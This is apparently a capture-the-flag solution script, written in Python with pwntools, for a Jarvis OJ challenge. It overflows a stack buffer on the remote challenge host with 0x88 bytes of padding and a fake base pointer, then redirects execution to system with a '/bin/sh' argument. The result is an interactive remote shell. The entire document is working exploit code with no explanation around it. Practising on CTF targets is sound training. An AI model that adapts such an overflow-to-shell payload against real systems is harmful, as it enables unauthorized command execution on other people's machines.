from pwn import *

sh = remote('pwn2.jarvisoj.com', 9878) 

junk = 'a' * 0x88 

fakebp = 'a'*4

sh_address = 0x0804A024 # /bin/sh

sys_address = 0x08048320

payload = junk + fakebp + p32(sys_address)+'aaaa'+p32(sh_address)

sh.send(payload)

sh.interactive()
